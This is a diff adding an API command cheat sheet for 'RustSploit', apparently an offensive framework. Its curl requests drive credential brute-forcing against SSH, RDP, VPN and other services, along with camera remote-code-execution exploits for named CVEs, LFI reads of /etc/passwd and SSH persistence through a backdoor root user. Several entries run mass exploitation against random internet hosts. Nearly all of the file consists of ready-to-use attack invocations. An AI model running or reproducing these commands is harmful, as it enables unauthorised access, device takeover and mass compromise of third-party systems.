@@ -1,0 +1,1601 @@
+# RustSploit API — Template Commands (Tested & Verified)
+# ═══════════════════════════════════════════════════════════════
+# Tested against emulated servers (test_servers.py)
+# Default creds: admin/password123, root/toor
+# SNMP community: public
+#
+# API Key: testkey123 (replace with your actual key)
+# Wordlists: Absolute paths to test_users.txt, test_passwords.txt
+#
+# Start API:  cargo run -- --api --api-key testkey123 --interface 127.0.0.1
+# Start test: python3 test_servers.py
+# ═══════════════════════════════════════════════════════════════
+
+# ─── Health Check ────────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/health | python3 -m json.tool
+
+# ─── List Modules ───────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/modules \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── Search Modules ─────────────────────────────────────────────────
+
+curl -s "http://127.0.0.1:8080/api/modules/search?q=ssh" \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── Set Target ─────────────────────────────────────────────────────
+
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "127.0.0.1"}' | python3 -m json.tool
+
+# ─── Set Target (CIDR subnet) ──────────────────────────────────────
+
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "192.168.1.0/24"}' | python3 -m json.tool
+
+# ─── Show Target ────────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── List Result Files ──────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/results \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── Get Result File ────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/results/ssh_results.txt \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# BRUTEFORCE MODULES — Tested against emulated servers
+# save_results: "y" enables output file creation
+# CIDR: use target like "127.0.0.1/32" or "192.168.1.0/24"
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 1. SSH Bruteforce ──────────────────────────────────────────────
+# TESTED ✅ — Found root:toor against emulated SSH on port 2222
+# save_results ✅ — Saved to ssh_results.txt
+# CIDR ✅ — Subnet detected, sequential per-host scanning
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "2222",
+      "use_defaults": "n",
+      "use_username_wordlist": "y",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "use_password_wordlist": "y",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "5",
+      "retry_on_error": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "ssh_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "save_unknown_responses": "n"
+    }
+  }' | python3 -m json.tool
+
+# SSH CIDR example:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_bruteforce",
+    "target": "127.0.0.1/32",
+    "prompts": {
+      "port": "2222",
+      "use_defaults": "n",
+      "use_username_wordlist": "y",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "use_password_wordlist": "y",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "5",
+      "retry_on_error": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "ssh_cidr_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "save_unknown_responses": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 2. FTP Bruteforce ──────────────────────────────────────────────
+# No emulator available. save_results and CIDR implemented.
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ftp_bruteforce",
+    "target": "10.0.0.1",
+    "prompts": {
+      "port": "21",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "10",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "ftp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y"
+    }
+  }' | python3 -m json.tool
+
+# ─── 3. SMTP Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found root:toor against emulated SMTP on port 2525
+# save_results ✅ — Saved to smtp_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/smtp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "2525",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "threads": "5",
+      "delay_ms": "100",
+      "stop_on_success": "y",
+      "combo_mode": "y",
+      "verbose": "n",
+      "save_results": "y",
+      "output_file": "smtp_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 4. POP3 Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found root:toor against emulated POP3 on port 1110
+# save_results ✅ — Saved to pop3_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/pop3_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "use_ssl": "n",
+      "port": "1110",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "threads": "5",
+      "delay_ms": "50",
+      "timeout": "5",
+      "combo_mode": "y",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "pop3_results.txt",
+      "verbose": "n",
+      "retry_on_error": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 5. MQTT Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found root:toor + admin:password123 against emulated MQTT on port 1884
+# save_results ✅
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/mqtt_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "1884",
+      "use_tls": "n",
+      "test_anonymous": "n",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "5",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "mqtt_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "client_id": "rustsploit"
+    }
+  }' | python3 -m json.tool
+
+# MQTT CIDR example:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/mqtt_bruteforce",
+    "target": "127.0.0.1/32",
+    "prompts": {
+      "port": "1884",
+      "use_tls": "n",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "verbose": "n",
+      "output_file": "mqtt_cidr_results.txt",
+      "client_id": "rustsploit"
+    }
+  }' | python3 -m json.tool
+
+# ─── 6. SNMP Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found community 'public' against emulated SNMP on port 1161
+# save_results ✅ — Saved to snmp_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/snmp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "1161",
+      "community_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_communities.txt",
+      "snmp_version": "2c",
+      "concurrency": "5",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "snmp_results.txt",
+      "verbose": "n",
+      "timeout": "3"
+    }
+  }' | python3 -m json.tool
+
+# ─── 7. RTSP Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found admin:password123 + root:toor against emulated RTSP on port 5554
+# save_results ✅ — Saved to rtsp_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/rtsp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "5554",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "rtsp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "advanced_mode": "n",
+      "brute_force_paths": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 8. Telnet Bruteforce ─────────────────────────────────────────
+# TESTED ✅ — Module runs, mode 4 quick default check works
+# Mode 4 = Quick Default Check (built-in credential list)
+# Mode 1 = Single Target with custom wordlists
+
+# Mode 4: Quick default check
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/telnet_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "mode": "4",
+      "port": "2323",
+      "verbose": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "telnet_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# Mode 1: Single target with custom wordlists
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/telnet_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "mode": "1",
+      "port": "2323",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "output_file": "telnet_results.txt",
+      "delay_ms": "100",
+      "verbose": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "timeout": "5",
+      "threads": "5"
+    }
+  }' | python3 -m json.tool
+
+# ─── 9. RDP Bruteforce ─────────────────────────────────────────────
+# Requires xfreerdp on the system. No emulated server available.
+# save_results and CIDR implemented.
+
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/rdp_bruteforce",
+    "target": "10.0.0.1",
+    "prompts": {
+      "port": "3389",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "10",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "rdp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "security_level": "1"
+    }
+  }' | python3 -m json.tool
+
+# ─── 10. Fortinet SSL VPN Bruteforce ────────────────────────────────
+# HTTPS module. Emulated server on port 4443.
+# save_results and CIDR implemented.
+
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/fortinet_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "4443",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "3",
+      "timeout": "10",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "fortinet_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "trusted_cert": "",
+      "realm": ""
+    }
+  }' | python3 -m json.tool
+
+# ─── 11. L2TP Bruteforce ──────────────────────────────────────────
+# L2TP/CHAP protocol. Emulated server on port 1701 (UDP).
+# save_results and CIDR implemented.
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/l2tp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "1701",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "3",
+      "timeout_ms": "5000",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "l2tp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# CIDR SUBNET SCANNING EXAMPLES
+# All modules support arbitrary CIDR targets (e.g. /24, /28, /32)
+# ═══════════════════════════════════════════════════════════════
+
+# CIDR SSH (sequential per-host):
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_bruteforce",
+    "target": "192.168.1.0/28",
+    "prompts": {
+      "port": "22",
+      "use_defaults": "n",
+      "use_username_wordlist": "y",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "use_password_wordlist": "y",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "10",
+      "timeout": "5",
+      "retry_on_error": "n",
+      "stop_on_success": "n",
+      "save_results": "y",
+      "output_file": "ssh_subnet_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "save_unknown_responses": "n"
+    }
+  }' | python3 -m json.tool
+
+# CIDR SMTP (concurrent mass_scan_host):
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/smtp_bruteforce",
+    "target": "192.168.1.0/28",
+    "prompts": {
+      "port": "25",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "50",
+      "verbose": "n",
+      "output_file": "smtp_subnet_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# CIDR SNMP (concurrent mass_scan_host):
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/snmp_bruteforce",
+    "target": "192.168.1.0/24",
+    "prompts": {
+      "port": "161",
+      "community_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_communities.txt",
+      "snmp_version": "2c",
+      "concurrency": "50",
+      "stop_on_success": "n",
+      "save_results": "y",
+      "output_file": "snmp_subnet_results.txt",
+      "verbose": "n",
+      "timeout": "3"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# CAMERA EXPLOIT MODULES  (added 2026-03-17)
+# All modules now fully API-compatible via cfg_prompt_* wrappers.
+# Interactive CLI/shell behaviour is UNCHANGED — prompts fall back
+# to stdin when not in API mode.
+# Prompt keys match the key names documented in each module's
+# cfg_prompt_* calls.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 12. ACTi ACM-5611 RCE ──────────────────────────────────────────
+# Single target (check vuln + run command):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/acti/acm_5611_rce",
+    "target": "192.168.1.100",
+    "prompts": { "port": "8080", "command": "id" }
+  }' | python3 -m json.tool
+
+# CIDR subnet scan:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/acti/acm_5611_rce",
+    "target": "192.168.1.0/24",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# Mass scan (infinite random):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/acti/acm_5611_rce",
+    "target": "0.0.0.0",
+    "prompts": {
+      "port": "8080",
+      "exclude_ranges": "y",
+      "output_file": "acti_hits.txt",
+      "concurrency": "100"
+    }
+  }' | python3 -m json.tool
+
+# ─── 13. AVTech Camera CVE-2024-7029 RCE ────────────────────────────
+# Single target (runs vuln check, then interactive shell in CLI mode):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/avtech/cve_2024_7029_avtech_camera",
+    "target": "192.168.1.101",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# Mass scan (infinite random, exclude RFC1918):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/avtech/cve_2024_7029_avtech_camera",
+    "target": "0.0.0.0",
+    "prompts": { "exclude_ranges": "y" }
+  }' | python3 -m json.tool
+
+# ─── 14. Hikvision CVE-2021-36260 RCE ──────────────────────────────
+# mode 1=safe check  2=reboot check  3=run cmd+read output  4=blind cmd
+# 5=interactive shell (CLI only)  6=SSH shell via dropbear
+# Mass scan: scan_mode 1=safe / 2=unsafe reboot / 3=custom payload (max 22 chars)
+
+# Single target — safe vuln check:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "192.168.1.102",
+    "prompts": { "mode": "1" }
+  }' | python3 -m json.tool
+
+# Single target — execute command + read output (max 22-char cmd):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "192.168.1.102",
+    "prompts": { "mode": "3", "command": "id" }
+  }' | python3 -m json.tool
+
+# Single target — unsafe reboot check (confirm required):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "192.168.1.102",
+    "prompts": { "mode": "2", "confirm_reboot": "y" }
+  }' | python3 -m json.tool
+
+# Mass scan — safe check:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "hikvision_hits.txt",
+      "scan_mode": "1"
+    }
+  }' | python3 -m json.tool
+
+# Mass scan — custom payload (max 22 chars):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "hikvision_rce_hits.txt",
+      "scan_mode": "3",
+      "custom_payload": "id>webLib/x"
+    }
+  }' | python3 -m json.tool
+
+# ─── 15. ABUS CVE-2023-26609 (LFI / RCE / SSH Persistence) ─────────
+# mode 1=LFI  mode 2=RCE  mode 3=SSH persistence
+# Mass scan: scan_mode 1=standard check  2=custom command
+
+# Single target — LFI:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "192.168.1.103",
+    "prompts": { "mode": "1", "filepath": "/etc/passwd" }
+  }' | python3 -m json.tool
+
+# Single target — RCE:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "192.168.1.103",
+    "prompts": { "mode": "2", "command": "id" }
+  }' | python3 -m json.tool
+
+# Single target — SSH persistence (new root user):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "192.168.1.103",
+    "prompts": { "mode": "3", "password": "H@ckedR00t!" }
+  }' | python3 -m json.tool
+
+# Mass scan — standard RCE check:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "abus_hits.txt",
+      "scan_mode": "1"
+    }
+  }' | python3 -m json.tool
+
+# Mass scan — custom command:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "abus_rce_hits.txt",
+      "scan_mode": "2",
+      "custom_command": "id"
+    }
+  }' | python3 -m json.tool
+
+# ─── 16. Reolink CVE-2019-11001 (Authenticated RCE) ─────────────────
+# Requires valid credentials.
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/reolink/reolink_rce_cve_2019_11001",
+    "target": "192.168.1.104",
+    "prompts": {
+      "username": "admin",
+      "password": "admin123",
+      "command": "id"
+    }
+  }' | python3 -m json.tool
+
+# ─── 17. Uniview NVR Password Disclosure ────────────────────────────
+# Unauthenticated. Extracts + decodes all user credentials.
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/uniview/uniview_nvr_pwd_disclosure",
+    "target": "192.168.1.105",
+    "prompts": { "output_file": "uniview_creds.txt" }
+  }' | python3 -m json.tool
+
+# ─── 18. FTP Anonymous Login — Mass Scan ────────────────────────────
+# target "0.0.0.0" = infinite random internet scan
+
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ftp_anonymous",
+    "target": "0.0.0.0",
+    "prompts": {
+      "concurrency": "500",
+      "verbose": "n",
+      "output_file": "ftp_anon_results.txt",
+      "use_exclusions": "y"
+    }
+  }' | python3 -m json.tool
+
+# Single target FTP anon check (no prompts needed):
+curl -s --max-time 20 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ftp_anonymous",
+    "target": "192.168.1.200"
+  }' | python3 -m json.tool
+
+# ─── 19. CamXploit — Camera Discovery / Exploitation Scanner ────────
+# Fingerprints open ports, tests default creds, detects RTSP streams.
+
+# Single target:
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camxploit/camxploit",
+    "target": "192.168.1.150"
+  }' | python3 -m json.tool
+
+# Subnet:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camxploit/camxploit",
+    "target": "192.168.1.0/24"
+  }' | python3 -m json.tool
+
+# Mass random internet scan:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camxploit/camxploit",
+    "target": "0.0.0.0",
+    "prompts": {
+      "concurrency": "200",
+      "output_file": "camxploit_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# SCANNER MODULES  (added 2026-03-19)
+# All scanner modules now fully API-compatible via cfg_prompt_*
+# wrappers. Interactive CLI/shell behaviour is UNCHANGED.
+# Prompt keys match the key names documented in config.rs
+# and each module's cfg_prompt_* calls.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 20. Port Scanner ──────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/port_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "port_range": "1-1024",
+      "scan_method": "1",
+      "concurrency": "200",
+      "timeout": "3",
+      "show_only_open": "y",
+      "verbose": "n",
+      "output_file": ""
+    }
+  }' | python3 -m json.tool
+
+# ─── 21. SSH Scanner (Banner Grab) ───────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ssh_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "port": "22",
+      "additional_targets": "",
+      "load_from_file": "n",
+      "threads": "10",
+      "timeout": "5",
+      "save_results": "y",
+      "output_file": "ssh_scan_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 22. DNS Recursion Scanner ───────────────────────────────────
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/dns_recursion",
+    "target": "8.8.8.8",
+    "prompts": {
+      "port": "53",
+      "domain": "google.com",
+      "record_type": "A"
+    }
+  }' | python3 -m json.tool
+
+# ─── 23. HTTP Title Scanner ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/http_title_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "additional_targets": "",
+      "target_file": "",
+      "check_http": "y",
+      "check_https": "y",
+      "use_ports": "n",
+      "timeout": "10",
+      "save_results": "y",
+      "verbose": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 24. HTTP Method Scanner ────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/http_method_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "additional_targets": "",
+      "target_file": "",
+      "scheme": "https",
+      "use_ports": "n",
+      "timeout": "10",
+      "verbose": "n",
+      "save_results": "y"
+    }
+  }' | python3 -m json.tool
+
+# ─── 25. SMTP User Enum ─────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/smtp_user_enum",
+    "target": "192.168.1.1",
+    "prompts": {
+      "mode": "1",
+      "port": "25",
+      "wordlist": "/usr/share/wordlists/usernames.txt",
+      "threads": "10",
+      "timeout_ms": "3000",
+      "verbose": "n",
+      "save_valid": "y",
+      "valid_output": "smtp_valid_users.txt"
+    }
+  }' | python3 -m json.tool
+
